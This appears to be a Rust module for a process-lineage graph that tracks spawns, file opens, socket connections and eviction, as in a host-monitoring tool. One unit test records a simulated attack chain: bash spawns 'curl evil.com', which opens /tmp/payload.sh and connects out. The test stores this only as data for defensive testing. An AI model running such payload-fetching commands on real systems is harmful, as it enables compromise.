use petgraph::stable_graph::{EdgeIndex, NodeIndex, StableDiGraph};
use petgraph::visit::EdgeRef;
use petgraph::Direction;
use std::cmp::Ordering;
use std::collections::{BinaryHeap, HashMap, HashSet};
use std::path::PathBuf;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct ProcessKey {
    pub pid: u32,
    pub start_time_ns: u64,
}

impl ProcessKey {
    pub fn new(pid: u32, start_time_ns: u64) -> Self {
        Self { pid, start_time_ns }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct SocketKey {
    pub local_addr: String,
    pub remote_addr: String,
    pub proto: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum NodeKey {
    Process(ProcessKey),
    File(PathBuf),
    Socket(SocketKey),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProcessStatus {
    Running,
    Exited { exit_code: i32, exit_time_ns: u64 },
}

#[derive(Debug, Clone)]
pub struct ProcessPayload {
    pub key: ProcessKey,
    pub comm: String,
    pub cmdline: String,
    pub uid: u32,
    pub status: ProcessStatus,
    pub last_seen_ns: u64,
}

#[derive(Debug, Clone)]
pub struct FilePayload {
    pub path: PathBuf,
    pub first_seen_ns: u64,
    pub last_seen_ns: u64,
}

#[derive(Debug, Clone)]
pub struct SocketPayload {
    pub key: SocketKey,
    pub first_seen_ns: u64,
    pub last_seen_ns: u64,
}

#[derive(Debug, Clone)]
pub enum NodePayload {
    Process(ProcessPayload),
    File(FilePayload),
    Socket(SocketPayload),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EdgeKind {
    Spawns,
    OpenedFile { flags: u32, mode: u32 },
    ConnectedTo { proto: String },
}

#[derive(Debug, Clone)]
pub struct EdgeData {
    pub kind: EdgeKind,
    pub timestamp_ns: u64,
}

#[derive(Debug, Default)]
pub struct PruneStats {
    pub removed_nodes: usize,
    pub removed_edges: usize,
    pub skipped_stale: usize,
    pub has_more: bool,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct EvictionEntry {
    pub expiry_ns: u64,
    pub key: NodeKey,
}

impl Ord for EvictionEntry {
    fn cmp(&self, other: &Self) -> Ordering {
        other.expiry_ns.cmp(&self.expiry_ns)
            .then_with(|| self.key_discriminant().cmp(&other.key_discriminant()))
    }
}

impl PartialOrd for EvictionEntry {
    fn partial_cmp(&self, other: &Self) -> Option<Ordering> {
        Some(self.cmp(other))
    }
}

impl EvictionEntry {
    fn key_discriminant(&self) -> u8 {
        match self.key {
            NodeKey::Process(_) => 0,
            NodeKey::File(_) => 1,
            NodeKey::Socket(_) => 2,
        }
    }
}

pub struct ProcessGraph {
    pub graph: StableDiGraph<NodePayload, EdgeData>,
    pub key_to_index: HashMap<NodeKey, NodeIndex>,
    pub active_pids: HashMap<u32, ProcessKey>,
    pub eviction_queue: BinaryHeap<EvictionEntry>,
    pub ttl_ns: u64,
}

impl ProcessGraph {
    pub fn new(ttl_ns: u64) -> Self {
        Self {
            graph: StableDiGraph::new(),
            key_to_index: HashMap::new(),
            active_pids: HashMap::new(),
            eviction_queue: BinaryHeap::new(),
            ttl_ns,
        }
    }

    pub fn get_active_process_key(&self, pid: u32) -> Option<ProcessKey> {
        self.active_pids.get(&pid).copied()
    }

    pub fn add_or_update_process(
        &mut self,
        key: ProcessKey,
        comm: &str,
        cmdline: &str,
        uid: u32,
        now_ns: u64,
    ) -> NodeIndex {
        let node_key = NodeKey::Process(key);
        if let Some(&idx) = self.key_to_index.get(&node_key) {
            if let Some(NodePayload::Process(proc)) = self.graph.node_weight_mut(idx) {
                proc.last_seen_ns = now_ns;
                if !comm.is_empty() {
                    proc.comm = comm.to_string();
                }
                if !cmdline.is_empty() {
                    proc.cmdline = cmdline.to_string();
                }
            }
            self.active_pids.insert(key.pid, key);
            self.eviction_queue.push(EvictionEntry {
                expiry_ns: now_ns.saturating_add(self.ttl_ns),
                key: node_key,
            });
            idx
        } else {
            let payload = NodePayload::Process(ProcessPayload {
                key,
                comm: comm.to_string(),
                cmdline: cmdline.to_string(),
                uid,
                status: ProcessStatus::Running,
                last_seen_ns: now_ns,
            });
            let idx = self.graph.add_node(payload);
            self.key_to_index.insert(node_key.clone(), idx);
            self.active_pids.insert(key.pid, key);
            self.eviction_queue.push(EvictionEntry {
                expiry_ns: now_ns.saturating_add(self.ttl_ns),
                key: node_key,
            });
            idx
        }
    }

    pub fn record_spawn(
        &mut self,
        parent_key: Option<ProcessKey>,
        child_key: ProcessKey,
        child_comm: &str,
        child_cmdline: &str,
        child_uid: u32,
        ts_ns: u64,
    ) -> (NodeIndex, Option<EdgeIndex>) {
        let child_idx = self.add_or_update_process(child_key, child_comm, child_cmdline, child_uid, ts_ns);

        let edge_idx = if let Some(p_key) = parent_key {
            let parent_idx = self.add_or_update_process(p_key, "", "", 0, ts_ns);

            let existing_edge = self.graph.edges_connecting(parent_idx, child_idx)
                .find(|e| matches!(e.weight().kind, EdgeKind::Spawns))
                .map(|e| e.id());

            if let Some(e_idx) = existing_edge {
                Some(e_idx)
            } else {
                Some(self.graph.add_edge(
                    parent_idx,
                    child_idx,
                    EdgeData {
                        kind: EdgeKind::Spawns,
                        timestamp_ns: ts_ns,
                    },
                ))
            }
        } else {
            None
        };

        (child_idx, edge_idx)
    }

    pub fn record_spawn_by_ppid(
        &mut self,
        ppid: u32,
        child_key: ProcessKey,
        child_comm: &str,
        child_cmdline: &str,
        child_uid: u32,
        ts_ns: u64,
    ) -> (NodeIndex, Option<EdgeIndex>) {
        let parent_key = self.active_pids.get(&ppid).copied();
        self.record_spawn(parent_key, child_key, child_comm, child_cmdline, child_uid, ts_ns)
    }

    pub fn record_file_open(
        &mut self,
        proc_key: ProcessKey,
        path: PathBuf,
        flags: u32,
        mode: u32,
        ts_ns: u64,
    ) -> (NodeIndex, EdgeIndex) {
        let proc_idx = self.add_or_update_process(proc_key, "", "", 0, ts_ns);
        let file_key = NodeKey::File(path.clone());

        let file_idx = if let Some(&idx) = self.key_to_index.get(&file_key) {
            if let Some(NodePayload::File(f)) = self.graph.node_weight_mut(idx) {
                f.last_seen_ns = ts_ns;
            }
            idx
        } else {
            let idx = self.graph.add_node(NodePayload::File(FilePayload {
                path,
                first_seen_ns: ts_ns,
                last_seen_ns: ts_ns,
            }));
            self.key_to_index.insert(file_key.clone(), idx);
            idx
        };

        self.eviction_queue.push(EvictionEntry {
            expiry_ns: ts_ns.saturating_add(self.ttl_ns),
            key: file_key,
        });

        let edge_idx = self.graph.add_edge(
            proc_idx,
            file_idx,
            EdgeData {
                kind: EdgeKind::OpenedFile { flags, mode },
                timestamp_ns: ts_ns,
            },
        );

        (file_idx, edge_idx)
    }

    pub fn record_socket_connect(
        &mut self,
        proc_key: ProcessKey,
        socket: SocketKey,
        ts_ns: u64,
    ) -> (NodeIndex, EdgeIndex) {
        let proc_idx = self.add_or_update_process(proc_key, "", "", 0, ts_ns);
        let sock_node_key = NodeKey::Socket(socket.clone());

        let sock_idx = if let Some(&idx) = self.key_to_index.get(&sock_node_key) {
            if let Some(NodePayload::Socket(s)) = self.graph.node_weight_mut(idx) {
                s.last_seen_ns = ts_ns;
            }
            idx
        } else {
            let idx = self.graph.add_node(NodePayload::Socket(SocketPayload {
                key: socket,
                first_seen_ns: ts_ns,
                last_seen_ns: ts_ns,
            }));
            self.key_to_index.insert(sock_node_key.clone(), idx);
            idx
        };

        self.eviction_queue.push(EvictionEntry {
            expiry_ns: ts_ns.saturating_add(self.ttl_ns),
            key: sock_node_key,
        });

        let edge_idx = self.graph.add_edge(
            proc_idx,
            sock_idx,
            EdgeData {
                kind: EdgeKind::ConnectedTo {
                    proto: match self.graph.node_weight(sock_idx) {
                        Some(NodePayload::Socket(s)) => s.key.proto.clone(),
                        _ => "tcp".to_string(),
                    },
                },
                timestamp_ns: ts_ns,
            },
        );

        (sock_idx, edge_idx)
    }

    pub fn record_exit(&mut self, proc_key: ProcessKey, exit_code: i32, exit_time_ns: u64) -> bool {
        if let Some(curr) = self.active_pids.get(&proc_key.pid) {
            if *curr == proc_key {
                self.active_pids.remove(&proc_key.pid);
            }
        }

        let node_key = NodeKey::Process(proc_key);
        if let Some(&idx) = self.key_to_index.get(&node_key) {
            if let Some(NodePayload::Process(proc)) = self.graph.node_weight_mut(idx) {
                proc.status = ProcessStatus::Exited {
                    exit_code,
                    exit_time_ns,
                };
                proc.last_seen_ns = exit_time_ns;

                self.eviction_queue.push(EvictionEntry {
                    expiry_ns: exit_time_ns.saturating_add(self.ttl_ns),
                    key: node_key,
                });
                return true;
            }
        }
        false
    }

    pub fn record_exit_by_pid(&mut self, pid: u32, exit_code: i32, exit_time_ns: u64) -> bool {
        if let Some(key) = self.active_pids.remove(&pid) {
            self.record_exit(key, exit_code, exit_time_ns)
        } else {
            false
        }
    }

    pub fn resolve_ancestors(&self, start_key: &ProcessKey, max_hops: usize) -> Vec<ProcessPayload> {
        let mut ancestors = Vec::new();
        let start_idx = match self.key_to_index.get(&NodeKey::Process(*start_key)) {
            Some(&idx) => idx,
            None => return ancestors,
        };

        let mut visited = HashSet::new();
        visited.insert(start_idx);

        let mut current_idx = start_idx;
        let mut hops = 0;

        while hops < max_hops {
            let parent_node = self.graph
                .edges_directed(current_idx, Direction::Incoming)
                .find(|e| matches!(e.weight().kind, EdgeKind::Spawns))
                .map(|e| e.source());

            match parent_node {
                Some(p_idx) => {
                    if !visited.insert(p_idx) {
                        break;
                    }
                    if let Some(NodePayload::Process(p_data)) = self.graph.node_weight(p_idx) {
                        ancestors.push(p_data.clone());
                        current_idx = p_idx;
                        hops += 1;
                    } else {
                        break;
                    }
                }
                None => break,
            }
        }

        ancestors
    }

    pub fn get_parent(&self, key: &ProcessKey) -> Option<ProcessPayload> {
        self.resolve_ancestors(key, 1).into_iter().next()
    }

    pub fn prune_expired_budgeted(&mut self, now_ns: u64, max_prune_batch: usize) -> PruneStats {
        let mut stats = PruneStats::default();

        while let Some(top) = self.eviction_queue.peek() {
            if top.expiry_ns > now_ns {
                break;
            }

            if stats.removed_nodes >= max_prune_batch {
                stats.has_more = true;
                return stats;
            }

            let entry = self.eviction_queue.pop().unwrap();

            let node_idx = match self.key_to_index.get(&entry.key) {
                Some(&idx) => idx,
                None => {
                    stats.skipped_stale += 1;
                    continue;
                }
            };

            let should_delete = match self.graph.node_weight(node_idx) {
                Some(NodePayload::Process(proc)) => {
                    match proc.status {
                        ProcessStatus::Running => false,
                        ProcessStatus::Exited { exit_time_ns, .. } => {
                            let actual_expiry = exit_time_ns.saturating_add(self.ttl_ns);
                            if actual_expiry > now_ns {
                                false
                            } else {
                                let has_active_children = self.graph
                                    .edges_directed(node_idx, Direction::Outgoing)
                                    .filter(|e| matches!(e.weight().kind, EdgeKind::Spawns))
                                    .any(|e| {
                                        if let Some(NodePayload::Process(child)) = self.graph.node_weight(e.target()) {
                                            child.status == ProcessStatus::Running
                                        } else {
                                            false
                                        }
                                    });

                                !has_active_children
                            }
                        }
                    }
                }
                Some(NodePayload::File(f)) => {
                    let actual_expiry = f.last_seen_ns.saturating_add(self.ttl_ns);
                    if actual_expiry > now_ns {
                        false
                    } else {
                        self.graph.edges_directed(node_idx, Direction::Incoming).count() == 0
                    }
                }
                Some(NodePayload::Socket(s)) => {
                    let actual_expiry = s.last_seen_ns.saturating_add(self.ttl_ns);
                    if actual_expiry > now_ns {
                        false
                    } else {
                        self.graph.edges_directed(node_idx, Direction::Incoming).count() == 0
                    }
                }
                None => false,
            };

            if should_delete {
                let edge_count_before = self.graph.edge_count();
                self.graph.remove_node(node_idx);
                let edge_count_after = self.graph.edge_count();

                self.key_to_index.remove(&entry.key);
                stats.removed_nodes += 1;
                stats.removed_edges += edge_count_before.saturating_sub(edge_count_after);
            }
        }

        stats.has_more = self.eviction_queue.peek().map_or(false, |top| top.expiry_ns <= now_ns);
        stats
    }

    pub fn prune_expired(&mut self, now_ns: u64) -> PruneStats {
        let mut total_stats = PruneStats::default();
        loop {
            let stats = self.prune_expired_budgeted(now_ns, 1024);
            total_stats.removed_nodes += stats.removed_nodes;
            total_stats.removed_edges += stats.removed_edges;
            total_stats.skipped_stale += stats.skipped_stale;
            if !stats.has_more {
                break;
            }
        }
        total_stats
    }

    pub fn node_count(&self) -> usize {
        self.graph.node_count()
    }

    pub fn edge_count(&self) -> usize {
        self.graph.edge_count()
    }

    pub fn format_recent_forest(&self, max_entries: usize) -> Vec<String> {
        let mut lines = Vec::new();
        for (&pid, key) in self.active_pids.iter().take(max_entries) {
            let node_key = NodeKey::Process(*key);
            if let Some(&idx) = self.key_to_index.get(&node_key) {
                if let Some(NodePayload::Process(proc)) = self.graph.node_weight(idx) {
                    let ancestors = self.resolve_ancestors(key, 3);
                    let mut lineage_str = String::new();
                    for anc in ancestors.iter().rev() {
                        lineage_str.push_str(&format!("PID {} ({}) ➔ ", anc.key.pid, anc.comm));
                    }
                    lineage_str.push_str(&format!("PID {} [{}] (cmd: {})", pid, proc.comm, proc.cmdline));
                    lines.push(lineage_str);
                }
            }
        }
        if lines.is_empty() {
            lines.push("No active process lineages currently tracked in memory.".to_string());
        }
        lines
    }

    /// Returns all process payloads currently in the graph (both running and exited)
    pub fn list_all_processes(&self) -> Vec<ProcessPayload> {
        let mut list = Vec::new();
        for idx in self.graph.node_indices() {
            if let Some(NodePayload::Process(proc)) = self.graph.node_weight(idx) {
                list.push(proc.clone());
            }
        }
        list.sort_by(|a, b| b.last_seen_ns.cmp(&a.last_seen_ns));
        list
    }

    /// Resolves full chain information for a given process key
    pub fn get_chain_info(&self, key: &ProcessKey) -> Option<FullChainInfo> {
        let node_key = NodeKey::Process(*key);
        let node_idx = *self.key_to_index.get(&node_key)?;
        let proc = match self.graph.node_weight(node_idx)? {
            NodePayload::Process(p) => p.clone(),
            _ => return None,
        };

        let mut ancestors = self.resolve_ancestors(key, 8);
        ancestors.reverse();
        let ppid = ancestors.last().map(|p| p.key.pid);

        let mut children = Vec::new();
        let mut files = Vec::new();
        let mut sockets = Vec::new();

        for edge in self.graph.edges_directed(node_idx, Direction::Outgoing) {
            match edge.weight().kind {
                EdgeKind::Spawns => {
                    if let Some(NodePayload::Process(child)) = self.graph.node_weight(edge.target()) {
                        children.push(child.clone());
                    }
                }
                EdgeKind::OpenedFile { .. } => {
                    if let Some(NodePayload::File(f)) = self.graph.node_weight(edge.target()) {
                        files.push(f.path.clone());
                    }
                }
                EdgeKind::ConnectedTo { .. } => {
                    if let Some(NodePayload::Socket(s)) = self.graph.node_weight(edge.target()) {
                        sockets.push(s.key.clone());
                    }
                }
            }
        }

        Some(FullChainInfo {
            process: proc,
            ppid,
            ancestors,
            children,
            files,
            sockets,
        })
    }
}

#[derive(Debug, Clone)]
pub struct FullChainInfo {
    pub process: ProcessPayload,
    pub ppid: Option<u32>,
    pub ancestors: Vec<ProcessPayload>,
    pub children: Vec<ProcessPayload>,
    pub files: Vec<PathBuf>,
    pub sockets: Vec<SocketKey>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_budgeted_lazy_eviction_queue() {
        let mut pg = ProcessGraph::new(10_000_000_000); // 10s TTL
        let k1 = ProcessKey::new(101, 1_000);
        let k2 = ProcessKey::new(102, 2_000);

        pg.add_or_update_process(k1, "sh", "sh", 0, 1_000);
        pg.add_or_update_process(k2, "curl", "curl", 0, 2_000);

        pg.record_exit(k1, 0, 3_000_000_000);
        pg.record_exit(k2, 0, 4_000_000_000);

        // At t = 5s, nothing expired yet
        let stats_5s = pg.prune_expired_budgeted(5_000_000_000, 10);
        assert_eq!(stats_5s.removed_nodes, 0);

        // At t = 14s, k1 (3s + 10s = 13s) is expired, but batch budget of 1 only removes k1
        let stats_14s_b1 = pg.prune_expired_budgeted(14_000_000_000, 1);
        assert_eq!(stats_14s_b1.removed_nodes, 1);

        // At t = 15s, k2 is also expired
        let stats_15s = pg.prune_expired(15_000_000_000);
        assert_eq!(stats_15s.removed_nodes, 1);
    }

    #[test]
    fn test_chain_info_extraction() {
        let mut pg = ProcessGraph::new(60_000_000_000);
        let parent_key = ProcessKey::new(100, 1_000);
        let child_key = ProcessKey::new(200, 2_000);

        pg.record_spawn(None, parent_key, "bash", "/bin/bash", 1000, 1_000);
        pg.record_spawn(Some(parent_key), child_key, "curl", "curl evil.com", 1000, 2_000);
        pg.record_file_open(child_key, PathBuf::from("/tmp/payload.sh"), 0, 0, 2_500);
        pg.record_socket_connect(child_key, SocketKey { local_addr: "10.0.0.1:4000".into(), remote_addr: "192.168.1.1:80".into(), proto: "tcp".into() }, 2_600);

        let chain = pg.get_chain_info(&child_key).expect("Should find child chain");
        assert_eq!(chain.ppid, Some(100));
        assert_eq!(chain.ancestors.len(), 1);
        assert_eq!(chain.ancestors[0].key.pid, 100);
        assert_eq!(chain.files.len(), 1);
        assert_eq!(chain.sockets.len(), 1);
        assert_eq!(chain.process.key.pid, 200);

        // Record exit for child
        pg.record_exit(child_key, 0, 3_000);
        let all = pg.list_all_processes();
        assert_eq!(all.len(), 2);
        let exited_child = all.iter().find(|p| p.key.pid == 200).unwrap();
        assert!(matches!(exited_child.status, ProcessStatus::Exited { exit_code: 0, .. }));
    }
}
